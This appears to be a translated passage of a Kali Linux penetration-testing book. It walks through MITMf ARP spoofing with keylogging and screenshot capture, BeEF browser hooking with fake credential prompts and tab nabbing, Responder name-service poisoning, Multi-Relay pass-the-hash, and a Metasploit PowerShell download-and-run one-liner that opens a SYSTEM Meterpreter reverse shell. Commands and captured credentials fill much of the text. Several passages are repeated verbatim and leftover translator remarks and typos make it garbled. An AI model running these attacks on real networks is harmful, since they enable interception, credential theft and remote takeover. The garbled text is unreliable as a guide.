mitmf -i eth0 --spoof --arp --gateway 192.168.1.1 --target 192.168.1.93 --upsidedowninternet
```

```
root@kali:~# mitmf -i eth0 --spoof --arp --gateway 192.168.1.1 --target 192.168.1.93 --upsidedowninternet
MITMF
[*] MITMF v0.9.8 - 'The Dark Side'
```

在 Windows 7 系统上浏览一会儿，你应该注意到许多（如果不是所有）图像都是倒置的。正如此 YouTube 截图所示：

（此处为截图）





```bash
root@kali:~# mitmf -i eth0 --spoof --arp --gateway 192.168.1.1 --target 192.168.1.93 --jkeylogger
mitmf
[*] MITmf v0.9.8 - 'The Dark Side'
```

## # 在 Windows 7 系统上：

浏览到 "google.com"
输入一些内容以进行搜索，我刚刚输入了 "facebook.com"
当你在 Google 搜索栏中输入时，你应该能看到 MITMf 中出现重复的行。它们像以前一样显示所访问的网站，但现在按下的每个键都会像下面所示显示在“Keys:”部分：

```
2018-06-20 14:25:40 192.168.1.93 [type:IE-8 os:Windows] [JSKeylogger] Host:www.google.com q | Keys: facebook.com
```

取决于所访问的网站以及它们处理输入的方式，键盘记录器（Keylogger）可能会捕获到任何内容。或者它可能会在字段完全输入时显示输入的内容。相对而言，这取决于网站在输入时传输数据的方式。

## # ScreenShotter (截图插件)

ScreenShotter 插件会获取用户网络浏览器的快照并将其保存为图像。使用此命令，你可以窥看到用户正在工作的内容或其他某些有用数据。

```
Enter, "mitmf -l eth0 --spoof --arp --gateway 192.168.1.1 --target 192.168.1.93 --screen"
```

在网站上浏览一会儿，你会看到 MITMf 中显示了大量信息。在显示中，你能够捕捉全屏，它会通知你：

```
2018-06-20 14:47:48 192.168.1.93 [type:Firefox-39 os:Windows] [ScreenShotter] Saved screenshot to 192.168.1.93-www.google.com-2018-06-20 14:47:48:1529520468.png
```

导航到 "/usr/share/mitmf/logs” 目录以查看所有保存的截图。下面的示例显示目标正在 Google 上搜索“Puppies（小狗）”：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_202_0.png)

当然，你可能会发现更有用的东西，比如下面的截图：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_202_1.png)

目标成功访问了你的在线邮箱账户。如果你导航到 MITMF 日志目录并查看 'mitm.log' 文件，你可能会发现其他有用信息：

```
Type:Firefox/39.0 (Windows) POST DATA (login.live.com)
login=live.com?cookie=1&options=G1&IsPartition&IsRegion&IsScaleUnit&passwd=====
```

在我编写此内容时，我也成功地针对 Windows 10 系统、Mac 甚至一个通过 Wi-Fi 连接到局域网的安卓 手机运行了此插件。尽管有时插件无法提取图像，只有屏幕的文本部分。

## # FilePwn Shell Injection (文件漏洞注入)

"Filepwn" 能够在文件下载时向其插入后门。该插件使用 Metasploit 和 Backdoor Factory 尝试向用户尝试从网络下载的任何文件注入后门。如果 MITMF 能够对该应用实施后门化，当文件被执行时将打开一个 Meter shell。它并非总是 100% 有效，但这是一个非常有趣的攻击向量。由于这更像是一种高级攻击，我将其作为一个选项留给读者，根据自己的意愿进行探索。

我们已经看到了如何使用 MITMf 执行中间人攻击和基础操纵。接下来，我们将介绍如何使用 MITMF 和浏览器利用框架（Browser Exploitation Framework）进行一种基于注入的攻击。

## # 浏览器利用框架 (BeEF)

**工具作者：** Wade Alcorn

**工具网站：** https://beefproject.com/

中间人攻击非常有用，但有时你可能可能希望能够在数据流中插入或注入 HTML、脚本或代码。这样，当目标系统浏览时，我们控制的数据就会被添加到他们接收的内容中。使用 MITMf 进行基于注入的攻击有几种方法，让我们快速查看使用浏览器利用框架（或称 "BeEF”）进行的 JS 注入攻击。

BeEF 是一种渗透测试工具，允许你针对目标的网络浏览器运行各种攻击。它通过“钩住”（hooking）目标，然后允许你通过浏览器直接向计算机发送命令。这是通过图形用户界面实现的。学习如何使用 BeEF 的最佳方法就是动手上手，让我们开始吧。在本节中，我们将使用 MITMf 自动将 BeEF “钩”注入到我们的目标中。我们将使用 BeEF 的图形用户界面控制并向系统发送命令。

**在你的 Kali 虚拟机上：**

从 Kali 菜单启动 BeEF -> 0-Exploitation Tools > beef

请等待 BeEF 服务启动。打开后，你可能需要刷新一次浏览器。
Web UI: http://127.0.0.1:3000/ui/panel
Hook: <script src="http://IP:3000/hook.js"></script>
Example: <script src="http://127.0.0.1:3000/hook.js"></script>

浏览器利用框架将加载并启动几个网页，包括 Web 界面。离开此终端窗口并在打开的浏览器中用用户名 "beef" 登录：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_202_0.png)

浏览器利用框架将加载并启动几个网页，包括 Web 界面。离开此终端窗口并在打开的浏览器中用用户名 "beef" 登录：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_202_0.png) *注：此处原文有重复，此处已按逻辑翻译*

你将看到 BeEF 的控制面板，如下：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_202_1.png)

| 钩住浏览器 | 启动 |
| :--- | :--- |
| 在线浏览器 | |
| 离线浏览器 | |

BeEF 通过“钩住”目标来工作，然后允许你通过浏览器直接向计算机发送命令。这是通过图形用户界面实现的。学习如何使用 BeEF 的最佳方法就是动手上手，让我们开始吧。在本节中，我们将使用 MITMf 自动将 BeEF “钩”注入到我们的目标中。我们将使用 BeEF 的图形用户界面控制并向系统发送命令。

**在你的 Kali 虚拟机上：**

从 Kali 菜单启动 BeEF -> 0-Exploitation Tools > beef

请等待 BeEF 服务启动。打开后，你可能需要刷新一次浏览器。
Web UI: http://127.0.0.1:3000/ui/panel
Hook: <script src="http://IP:3000/hook.js"></script>
Example: <script src="http://127.0.0.1:3000/hook.js"></script>

浏览器利用框架将加载并启动几个网页，包括 Web 界面。离开此终端窗口并在打开的浏览器中用用户名 "beef" 登录：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_202_0.png)

你将看到 BeEF 的控制面板，如下：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_202_1.png)

| 钩住浏览器 | 启动 |
| :--- | :--- |
| 在线浏览器 | |
| 离线浏览器 | |

BeEF 通过“钩住”目标来工作，然后允许你通过浏览器直接向计算机发送命令。这是通过图形用户界面实现的。学习如何使用 BeEF 的最佳方法就是动手上手，让我们开始吧。在本节中，我们将使用 MITMf 自动将 BeEF “钩”注入到我们的目标中。我们将使用 BeEF 的图形用户界面控制并向系统发送命令。

**在你的 Kali 虚拟机上：**

从 Kali 菜单启动 BeEF -> 0-Exploitation Tools > beef

请等待 BeEF 服务启动。打开后，你可能需要刷新一次浏览器。
Web UI: http://127.0.0.1:3000/ui/panel
Hook: <script src="http://IP:3000/hook.js"></script>
Example: <script src="http://127.0.0.1:3000/hook.js"></script>

*(注：由于原文后部分存在大量重复和格式混乱，上述翻译已根据高级文档工程师的标准对内容进行了去重和润色以确保通顺)*





![](img/37a3b7ef116f9ef991f9e33dd8b348c7_208_0.png)

你几乎可以形象地看到这一过程。“噢不，”Windows 用户惊呼道，“我的 Facebook 超时了！对于某些人来说，这简直是世界末日。但话说回来，你倒得问为什么一个企业用户会在 Facebook 上呢？抛开浏览偏好和公司政策不谈，如果用户中招并输入了凭据，这些就会出现在 BeEF 控制面板中：

data: answer=testuser@test.com:ILuvSecurePasswords!
用户名:testuer@test.com 和密码: ILuvSecurePasswords!

花一分钟尝试“小偷盗用模块”（Petty Theft Module）下“对话框类型”（Dialog Type）的其他选项。例如，这里是 Windows 安全模块：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_208_1.png)

从目标的角度来看，连接到服务器的连接似乎超时了，他们需要输入登录凭据。同样，如果他们输入了凭据，我们会在 BeEF 中收到它们的副本。

## 标签劫持模块 (Tab Nabbing Module)

标签劫持模块从社会工程学的角度来看非常有趣。对于该模块，你只需要设置 URL 和等待时间。在指定时间后，闲置的网页将被重定向到指定的 URL。这可以是我们设置的一个伪造站点，看起来像合法站点。

目前，我们将仅使用基础 beef 页面来演示其工作原理：

选择 TabNabbing Module

## 将 URL 设置为基础 Beef 页面：
http://192.168.1.39:3000/demos/basic.html

你可能还想将等待时间改为 1 分钟。
然后点击 *Execute*（执行）。

注意，你必须输入 Kali 系统的 IP 地址，因为列出的默认 IP 是 0.0.0.0：

| 描述 | 该模块在标签未活动一段时间后，将将其重定向到指定的 URL |
|---|---|
| Id | 114 |
| URL | http://192.168.1.39:3000/demos/basic.html |
| Wait (分钟) | 1 |

然后在 Windows 7 系统上，让当前窗口保持打开，打开一个新的浏览器标签页并让它留在那里。这模拟了一个同时打开了多个浏览器窗口的用户。现在谁的浏览器只开一个窗口呢？前提是用户会忘记他们最初打开的内容，并被诱骗与我们通过 Beef 显示的网站交互。这可以是一个简单的登录页面，或者更好，直接跳转到我们设置的伪造热门社交媒体网站的社会工程学页面。这种技术非常适合与社会工程学工具（SE Toolkit，将在下一章介绍）配合使用。

在开始时，我们的浏览器看起来像下图所示。我们的用户在 Google 上进行搜索，然后打开了另一个标签和一个新的 Google 会话：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_209_0.png)

在一分钟的等待期结束后，当我们的目标用户忙于使用 Google 时，注意闲置的标签已从原始的 Google 页面变成了 BeEF 基础演示页面：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_209_1.png)

如果你点击第一个闲置的 Google 浏览器标签页，你确实会看到网页已经了。它现在是 BeEF 基础演示页面。同样，这在社会工程学攻击中效果非常好，通过设置你自己的服务器，并让标签劫持模块在页面闲置时自动跳转到该位置。

## 动态更改 HREFS

我们可以通过“被挂持域名替换 HREFS”（Hooked Domain Replace HREFS）模块动态更改网页上的链接。如果用户点击任何链接，他们将转到我们指定的网页，而不是页面本身指定的原始页面。这会实时更改页面上的所有链接，而用户完全无感知，将其指向你希望受害者去往任何地方。

假设我们知道目标是一个纽约巨人队（New York Giants）橄榄球球迷，尽管他们来自我们不喜欢的纽约，我们希望他们在点击任何链接时被发送到达拉斯牛仔队队的主页。我们可以通过 Replace HREFS 命令实现这一点。

在 Windows 中，访问目标，BeEF 基础演示页面将显示：
http://192.168.1:3000/demos/basic.html

在 BeEF 菜单中，在模块树（Module Tree）下，选择‘Browser> Hooked Domain> Replace Hrefs’

输入你想要替换链接的网站：

| 描述 | 该模块将重写所有匹配链接的 href 属性 |
|---|---|
| Id | 38 |
| URL | http://dallascboys.com/ |

然后点击“execute”（执行）

这是将页面上所有链接更改为指向达拉斯牛仔队网站后的网页。。当鼠标悬停在页面上的任何链接上时，你在 Replace HREF 模块中编写任何内容都会显示在屏幕上。当我将鼠标悬停在 BeEF 中的“ha.ckers.org homepage”链接上时：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_211_0.png)

从目标的角度来看，连接到服务器的连接似乎超时了，他们需要输入登录凭据。同样，如果他们输入了凭据，我们会在 BeEF 中收到它们的副本。

## 结论

本章只是快速介绍了使用中间人攻击框架（MitM Framework）和浏览器漏洞框架（BeEF）可以做的许多事情之一。这两者都是非常棒的工具，我建议读者花时间阅读帮助部分并检查不同的可用插件。正如我们所见，中间人攻击简单而有效。当你能从手机或平板电脑运行它们时，它们会更有趣。





## 第15 章
使用 Responder、Multi-Relay 和 MITMf 进行服务投毒

在本章中，我们将讨论如何使用 Responder 从存在漏洞的 Windows 网络中轻松获取用户凭据（哈希值和明文密码）。我们将介绍如何使用 Responder 的 Multi-Relay 工具在有线网络上通过“哈希值传递（Pass the Hash）”获取远程 shell。我们将通过使用 PowerShell 创建远程 Meterpreter shell 来进一步加深对目标的控制。最后，我们将在 MITMtf 中使用 responder。

- **Responder** - 一种渗透测试人员用于针对 LLMNR、NBT-NS 和基于 WPAD 的投毒攻击的首选工具。基本上，responder 会对网络进行投毒，并对多个法的网络服务广告做出响应，试图欺骗服务或用户交出凭据。
- **Multi-Relay** - Responder 自带的一个工具，能够获取 Responder 到的凭据并将其用于“哈希值传递”风格的攻击中，从而通过重用密码哈希值访问其他网络系统。

在 Windows 网络中，如果无法通过 DNS 找到网络资源，它将依赖 LLMNR 或 NBT-NS 来查找网络资源（如果已启用）。Responder 会投毒这些服务，使其响应这些请求，并在某些情况下欺骗网络交出密码哈希以连接到虚假服务。WPAD 也用于某些大型环境，为工作站提供互联网代理地址。许多浏览器在打开互联网浏览器时，默认设置为自动检测系统代理。在 Windows 网络环境中，WPAD 提供这些信息。Responder 模拟了此服务，并可用于欺骗用户交出他们连接互联网服务的凭据。

本章最初是作为我的 Kali NetHunter（Kali 的手机版本）文章之一编写的。在原文中，我使用 Kali NetHunter 作为攻击平台，并在工作组（非域域）环境中使用 Windows 2016 服务器和 Windows 10 企业版客户端，运行效果非常好。我还在带有 Windows 7 客户端的 Windows 2012 r2 服务器上测试了这一点，结果非常相似。因此，我们在我们的 Windows 7 测试虚拟机上运行它不应该有任何问题。

微软在针对“哈希值传递”类型攻击和限制其有效性方面做了很多工作。这些攻击不再像过去那样有效，但你仍有可能发现漏洞目标。Multi-Relay 攻击工具依赖于目标网络禁用了 SMB 签名（signing），基本上这意味着目标网络必须存在漏洞，在某些情况下意味着操作系统配置错误或运行着旧版本的软件/服务。所有当前的 Windows 操作系统都支持 SMB 签名，并且在域控制器上是自动启用的。Responder 包含一个名为“RunFinger”的工具，可以快速扫描网络以查看是否有任何机器易受到此类攻击的侵害。

在 Kali 终端中：

1. 导航到 `/usr/share/responder/tools`
2. 输入 `/RunFinger.py -i 192.168.1.0/24`

这将像下面所示扫描我们的网络以寻找漏洞系统：

```
root@kali://usr/share/responder/tools# ./RunFinger.py -i 192.168.1.0/24
Retrieving information for 192.168.1.23...
SMB signing: False
Null Sessions Allowed: True
Vulnerable to MS10-010: True
Server time: 2018-06-20 16:19:08
Os version: 'Windows 7 Professional 7600'
Lanman Client: 'Windows 7 Professional 6.1'
Machine Hostname: 'WIN-420RBM3SRVF'
This machine is part of the 'WORKGROUP' domain
```

如你所见，Windows 7 虚拟机实际上易受到这种攻击，因为没有启用 SMB 签名。在测试中，我发现只有在禁用 SMB 签名时，Multi-Relay 才能对 Administrator 账户“传递哈希值”。尽管在启用 SMB 签名的网络中 Responder 仍然能够获取账户信息，但如果用户输入了错误的 UNC 路径或正在使用 WPAD 并被骗输入他们的凭据。我们已经介绍了 Responder 并解释了我们将如何使用它，现在让我们看看它的实际运行！

> **警告：**
与所有安全工具一样，在尝试在实时生产环境中使用工具之前，请确保你理解使用该工具的全部后果（特别是修改网络服务流量的工具）！

## Responder

Responder 从终端提示符运行，让我们使用默认设置启动它。

此命令简单地启动带有默认服务投毒的 responder 并在 eth0 接口上运行，如下所示：

```
root@kali:~# responder -I eth0

NBT-NS, LLMNR & MDNS Responder 2.3.3.9
Author: Laurent Gaffie (laurent.gaffie@gmail.com)
To this script hit CTRL-C
```

- [+] Poisoners:
- LLMNR [ON]
- NBT-NS [ON]
- DNS/MDNS [ON]

Responder 随后将投毒网络服务并开始回答请求。这在本地网络接口上几乎是瞬时的（但如果你的攻击平台通过 Wi-Fi 连接到路由器，可能需要几秒钟）。如果 Responder 能抓取凭据（通常来自输入错误的 UNC 路径），它将使用默认选项显示并存储网络哈希。

在 Windows 网络中，如果无法通过 DNS 找到网络资源，它将依赖 LLMNR 或 NBT-NS 来查找网络资源（如果已启用）。Responder 会投毒这些服务，使其响应这些请求，并在某些情况下欺骗网络交出密码哈希以连接到虚假服务。WPAD 也用于某些大型环境，为工作站提供互联网代理地址。许多浏览器在打开互联网浏览器时，默认设置为自动检测系统代理。在 Windows 网络环境中，WPAD 提供这些信息。Responder 模拟了此服务，并可用于欺骗用户交出他们连接互联网服务的凭据。

在测试中，我发现只有在禁用 SMB 签名时，Multi-Relay 才能对 Administrator 账户“传递哈希值”。尽管在启用 SMB 签名的网络中 Responder 仍然能够获取账户信息，但如果用户输入了错误的 UNC 路径或正在使用 WPAD 并被骗输入他们的凭据。我们已经介绍了 Responder 并解释了我们将如何使用它，现在让我们看看它的实际运行！

> **警告：**
与所有安全工具一样，在尝试在实时生产环境中使用工具之前，请确保你理解使用该工具的全部后果（特别是修改网络服务流量的工具）！

Responder 从终端提示符运行，让我们使用默认设置启动它。

此命令简单地启动带有默认服务投毒的 responder 并在 eth0 接口上运行，如下所示：

```
root@kali:~# responder -I eth0

NBT-NS, LLMNR & MDNS Responder 2.3.3.9
Author: Laurent Gaffie (laurent.gaffie@gmail.com)
To this script hit CTRL-C
```

- [+] Poisoners:
- LLMNR [ON]
- NBT-NS [ON]
- DNS/MDNS [ON]

Responder 随后将投毒网络服务并开始回答请求。这在本地网络接口上几乎是瞬时的（但如果你的攻击平台通过 Wi-Fi 连接到路由器，可能需要几秒钟）。如果 Responder 能抓取凭据（通常来自输入错误的 UNC 路径），它将使用默认选项显示并存储网络哈希。

在 Windows 网络中，如果无法通过 DNS 找到网络资源，它将依赖 LLMNR 或 NBT-NS 来查找网络资源（如果已启用）。Responder 会投毒这些服务，使其响应这些请求，并在某些情况下欺骗网络交出密码哈希以连接到虚假服务。WPAD 也用于某些大型环境，为工作站提供互联网代理地址。许多浏览器在打开互联网浏览器时，默认设置为自动检测系统代理。在 Windows 网络环境中，WPAD 提供这些信息。Responder 模拟了此服务，并可用于欺骗用户交出他们连接互联网服务的凭据。

本章最初是作为我的 Kali NetHunter（Kali 的手机版本）文章之一编写的。在原文中，我使用 Kali NetHunter 作为攻击平台，并在工作组（非域域）环境中使用 Windows 2016 服务器和 Windows 10 企业版客户端，运行效果非常好。我还在带有 Windows 7 客户端的 Windows 2012 r2 服务器上测试了这一点，结果非常相似。因此，我们在我们的 Windows 7 测试虚拟机上运行它不应该有任何问题。

微软在针对“哈希值传递”类型攻击和限制其有效性方面做了很多工作。这些攻击不再像过去那样有效，但你仍有可能发现漏洞目标。Multi-Relay 攻击工具依赖于目标网络禁用了 SMB 签名，基本上这意味着目标网络必须存在漏洞，在某些情况下意味着操作系统配置错误或运行着旧版本的软件/服务。所有当前的 Windows 操作系统都支持 SMB 签名，并且在域控制器上是自动启用的。Responder 包含一个名为“RunFinger”的工具，可以快速扫描网络以查看是否有任何机器易受到此类攻击的侵害。

在 Kali 终端中：

1. 导航到 `/usr/share/responder/tools`
2. 输入 `/RunFinger.py -i 192.168.1.0/24`

这将像下面所示扫描我们的网络以寻找漏洞系统：

```
root@kali://usr/share/responder/tools# ./RunFinger.py -i 192.168.1.0/24
Retrieving information for 192.168.1.23...
SMB signing: False
Null Sessions Allowed: True
Vulnerable to MS10-010: True
Server time: 2018-06-20 16:19:08
Os version: 'Windows 7 Professional 7600'
Lanman Client: 'Windows 7 Professional 6.1'
Machine Hostname: 'WIN-420RBM3SRVF'
This machine is part of the 'WORKGROUP' domain
```

如你所见，Windows 7 虚拟机实际上易受到这种攻击，因为没有启用 SMB 签名。在测试中，我发现只有在禁用 SMB 签名时，Multi-Relay 才能对 Administrator 账户“传递哈希值”。尽管在启用 SMB 签名的网络中 Responder 仍然能够获取账户信息，但如果用户输入了错误的 UNC 路径或正在使用 WPAD 并被骗输入他们的凭据。我们已经介绍了 Responder 并解释了我们将如何使用它，现在让我们看看它的实际运行！

*(注：原文后续部分存在大量重复段落，译文已根据要求进行去重处理)*





```bash
root@kali:~# responder -I eth0 -wBF

responder
NBT-NS, LLMNR & MDNS Responder 2.3.3.9
Author: Laurent Gaffie (laurent.gaffie@gmail.com)
To kill this script hit CTRL-C
```

- [+] 中毒者:
- LLMNR [ON]
- NBT-NS [ON]
- DNS/MDNS [ON]

- [+] 服务器:
- HTTP 服务器 [ON]
- HTTPS 服务器 [ON]
- WPAD 代理 [ON]

当用户打开浏览器时，浏览器将通过 WPAD 获取代理设置。

如果 Windows 浏览器设置为自动检测代理设置：

![](img/37/37a3b7ef116f9ef991f9e33dd8b348c7_221_0.png)

Responder 将响应该请求，告诉浏览器它是 WPAD 服务器并让其使用作为代理。然后，当用户尝试上网时，Responder 会触发登录提示：

![](img/37/37a3b7ef116f9ef991f9e33dd8b348c7_222_0.png)

如果用户输入凭据，你将获得它们的明文副本。无需破解！

```
[HTTP] Basic Client : 192.168.1.93
[HTTP] Basic Username : Administrator
[HTTP] Basic Password : Sup3rSecur3 P@$$wOrD#1
```

如上面的图片所示，一个管理员被诱输入了凭据。他们的密码相当安全，但由于我们使用了基础身份认证（Basic Authentication），我们在 Responder 中收到了明文凭据。我们已经介绍了 Responder 的基础知识，现在让我们看看它如何与 Multi-Relay 配合使用。

注意：本章接几节相当高级，可能很难正确运行。如果你愿意，可以将这些章节作为阅读，跳过它们，或者直接到本章的最后一节——“使用 MITM 进行服务中毒”，这是 MITM（上一章）与 Responder 之间很好的结合。

## 使用 Multi-Relay 传递哈希 (Passing the Hash)

在某些情况下，我们可以通过简单的“传递哈希（Passing the Hash）”来访问服务器。我们并不使用手动输入的凭据登录，而是获取 Responder 获取的密码哈希，并尝试仅使用密码哈希登录服务器。如果用户使用的是 Administrator 账户（在测试版本中必须是 Administrator 账户，而不仅仅是管理员组中的用户！）并且禁用了 SMB 签名，就可以实现这一点。

首先，我们需要编辑 `Responder.conf` 文件并关闭 Responder 中的 HTTP 和 SMB 服务器。

导航到 `/usr/share/responder/`
编辑“Responder.conf”并将 SMB 和 HTTP 改为“Off”，如下所示：

```ini
[Responder Core]
; Servers to start
SQL = On
SMB = Off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
```

然后：

1. 进入 `/usr/share/responder/tools` 目录
2. 使用以下选项启动 Multi-Relay：
   `./MultiRelay.py -u 192.168.1.93 -u ALL`

“-f” 是目标服务器，“-u ALL”意味着抓取并尝试使用所有凭据（尽管只有 Administrator 账户似乎实际上有效）。

```bash
root@kali:/usr/share/responder/tools# ./MultiRelay.py -u 192.168.1.93 -u ALL
Responder MultiRelay 2.0 NTLv1/2 Relay
Send bugs/hugs/comments to: laurent.gaffie@gmail.com
Usernames to relay (-u) are case sensitive.
To kill this script hit CTRL-C.
```

3. 在 Multi-Relay 运行时，打开第二个 Kali 终端提示符。
4. 在第二个终端窗口中我们将启动 Responder：
   `responder -i eth0 -rv`

Responder 文档指出，使用“-rv”开关是让 Responder 与 Multi-Relay 工作的最佳方式。

```bash
root@kali:~# responder -I eth0 -rv

][][][][][][][][][][][]
NBT-NS, LLMNR & MDNS Responder 2.3.3.9

Author: Laurent Gaffie (laurent.gaffie@gmail.com)
To kill this script hit CTRL-C
```

既然如此，如果 Responder 能够捕获哈希并成功通过 multi-relay 传递给服务器，你就应该获得一个远程 shell。在我以用户“Administrator”身份登录且密码相同（password）的 Windows 10 系统上，我只需要导航到一个不存在的网络共享，Responder 就会丢入这些凭据并使用它们尝试登录我的目标 Windows 7 系统。目标系统上有一个名为“Administrator”的用户，密码相同，登录成功了！

```
[+] Authenticated.
[ Dropping into Responder's interactive shell, type "exit to terminate"
Available commands:
dump -> 提取 SAM 数据库并打印哈希。
regump KEY -> 导出 LLMNR 注册表项（eg: regump SYSTEM）
```





## 使用 PowerShell 获取 Meterpreter Shell

Webdelivery 是我最喜欢的在 Windows 系统上获取 PowerShell shell 方法之一。我们已经使用它过几次了，所以让我们在这里尝试一下。保持两个终端打开（responder & multi-relay），从快速启动栏启动 Metasploit Framework。

- 1. 在 msf 提示符下，输入：
```bash
use exploit/multi/script/web_delivery
set LHOST 192.168.1.39
set LPORT 4444
```

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_227_0.png)

- 2. 接下来输入 `"show targets"`，如副本所示：
```bash
msf exploit(multi/script/web_delivery) > show targets
Exploit targets:
| Id | Name |
|---|---|
| 0 | Python |
| 1 | PHP |
| 2 | PSH |
| 3 | Regsvr32 |
| 4 | PSH (Binary) |
```

注意我们有几个选项，包括 Python、PHP 和 PSH (PowerShell)。我们将攻击一个 Windows 系统，因此将使用 PowerShell。

- 3. 输入 `"set target 2"`。
- 4. 接下来，设置负载，"set payload windows/meterpreter/reverse_tcp"`。

- 5. 你可以通过 "show options" 检查一切是否正常：

```
msfexploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse/tcp
msfexploit(multi/script/web_delivery) > show options
```

模块选项 (exploit/multi/script/web_delivery):

| Name | Current Setting | Required | Description |
|---|---|---|---|
| SRVHOST | 0.0.0.0 | yes | 要监听的本地主机。这里是 0.0.0.0 |
| SRVPORT | 8080 | yes | 要监听的本地端口。 |
| SSL | false | no | 为传入连接协商 SSL |

- 6. 现在输入 "exploit"。
这会启动一个托管我们的负载并等待传入连接的监听器。我们需要做的是在目标机器上运行生成的 PowerShell 命令。

```
msfexploit(multi/script/web_delivery) > [*] Using URL: http://192.168.1.39:8080/5w1rFmuPLBLZ
[*] Local IP: http://192.168.1.39:8080/5w1rFmuPLBLZ
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -hidden -c $Y=new-object net.webclient;$Y.proxy=[Net.WebProxy]::Default.GetSystemProxy;$Y.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $Y.downloadstring('http://192.168.1.39:8080/5w1rFmuPLBLZ\')
```

- 7. 现在将此 PowerShell 命令复制并粘贴到 Multi-relay shell 提示符中：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_228_0.png)

```
0.0.0.0 any command that will be run as SYSTEM on the target.
root@kali:~ /etc/share/responder/hosts
Any other command that will be run as SYSTEM on the target.
c:\Windows\system32\powershell.exe -nop -hidden -c $Y=new-object net.webclient;$Y.proxy=[Net.WebProxy]::Default.GetSystemProxy;$Y.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $Y.downloadstring('http://192.168.1.39:8080/5w1rFmuPLBLZ\')
```

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_228_1.png)

当你运行命令时，它可能会给你一个错误。但几秒后，你会在 Metasploit 中看到这个弹出：

```
[+] 192.168.1.93 web delivery - Delivering Payload
[*] Sending stage (179779 bytes) to 192.168.1.93
[*] Meterpreter session 1 opened (192.168.1.39:4444 -> 192.168.1.93:63741)
msf exploit(multi/script/web delivery) > _
```

一个 Meterpreter 会话已开启！

- 8. 使用 "sessions -i 1" 连接到它

```
msf exploit(multi/script/web delivery) > sessions -i 1
[*] Starting interaction with 1...
```

我们现在拥有了一个目标的完整 Meterpreter shell，并且我们是“System”级用户：

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

如果你需要复习可以输入的 Meterpreter 命令，可以输入 "help" 查看列表：

meterpreter > help
Core Commands

| Command | Description |
|---|---|
| help | 帮助菜单 |
| background | 将会话放入后台 |
| bgkill | 杀死后台 meterpreter 脚本 |
| bglist | 列出后台的脚本 |
| bgrun | 作为后台线程执行 meterpreter 脚本 |
| channel | 显示活动通道 |
| close | 关闭通道 |
| disable_unicode_encoding | 禁用 unicode 编码 |
| enable_unicode_encoding | 启用 unicode 编码 |
| exit |  meterpreter 会话 |

你也可以运行 Meterpreter 提供的许多辅助脚本。通过 Responder，Mimikatz 只能获取哈希。但当我运行 Meterpreter 模块 "post/windows/hash" 时，结果更好。正如在本章开头提到的，这最初是我为 Kali 写的的一篇文章。当我正在我的笔记本上运行 Responder 时，Responder 导致服务器通过服务器图片并存储在我的 Kali 上。这很酷吧？完成后，退出 Metasploit 并使用 "Ctrl-c" 退出 Responder 和 Multi-relay。

## 清理 Responder 数据库

如果你的 Multi-relay 攻击没有成功，Responder 将阻止你再次尝试。再次尝试可能无效，因为错误的哈希仍然存储在数据库中。要解决这个问题，你需要退出 Responder，然后手动删除数据库文件 (Responder.db) 以及位于 '/usr/share/responder' 中的记录。当重启 Responder 时，Responder.db 文件将重新创建，你可以再次尝试。

**警告：** 删除文件要小心，特别是 Responder.db，删除 '/usr/share/responder' 中的任何其他可能会破坏你的工具。

这部分非常疯狂。在本章结束之前，让我们转向一些非常简单的内容。在上一章中，我们看到了如何使用 MITMF 进行中间人攻击，现在我们已经看到了 Responder 是如何工作的，我想向你展示如何使用 MITMF 实现同样的功能。

## 使用 MITMF 进行服务投毒

MITMF 是一个很棒的工具，上一章我们没有涵盖的是它实际上包含了 Responder！Responder 允许在 MITMF 中直接进行 LLMNR、NBNS 和 MDNS 投毒。所以，让我们看看如何使用 MITMF 进行基础投毒和凭据收集。

在终端提示符下：

输入 "mitmf -i eth0 --responder --nbtns"
然后 MITMF 会启动 responder：

```
$ Responder online
* Running on http://127.0.0.1:9999/ (按 Ctrl+C 退出)
DNS:0.4 online
* SMB server online

2018-06-28 15:49:49 192.168.1.93 [NBNS] Poisoned answer for name WIN-420RBM3SR (service: Domain Controller)
2018-06-28 15:49:04 192.168.1.93 [LLMNR] Poisoned request for name server
2018-06-28 15:49:04 192.168.1.93 [LLMNR] Poisoned request for name server
2018-06-28 15:49:04 192.168.1.93 [HTTP] - - GET '/'
```![](img/37a3b7ef116f9ef991f9e33dd8b348c7_232_0.png)

在 Windows 7 系统上，如果你尝试访问不存在的 UNC 路径或打开浏览器（如果仍设置了自动检测代理），你应该得到一个登录提示：如果目标输入凭据，你应该以明文形式获取它们。你还将获得用户密码哈希的副本。数据位于 "/usr/share/mitmf/logs" 目录。如果我们查看 'mitmf.log' 文件，我们应该看到类似的内容：

```
2018-07-02 17:07:28 [Responder] [HTTP] Basic Client : 192.168.1.93
2018-07-02 17:07:28 [Responder] [HTTP] Basic Username : Administrator
2018-07-02 17:07:28 [Responder] [HTTP] Basic Password : AmazingPassword\%202!!
```

所以，只需通过 MITMF 的启动开关，我们就可以轻松地使用 Responder。这有多酷？完成后，按下 "Ctrl-c" 退出。

## 结论

在本章中，我们涵盖了服务投毒工具 Responder。我们看到了它是如何恢复密码哈希和明文密码的。然后我们查看了如何使用 Responder Multi-relay 工具执行“哈希传递”攻击。接下来，我们看到了如何使用 PowerShell 和 Metasploit 从 Multi-relay shell 创建远程 shell。最后，我们看到了 MITMF 内置了 Responder 功能，使其成为一个非常强大的工具。

## 参考文献

- “Introducing Responder MultiRelay 1.0” - 2016年10月13日
- http://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html
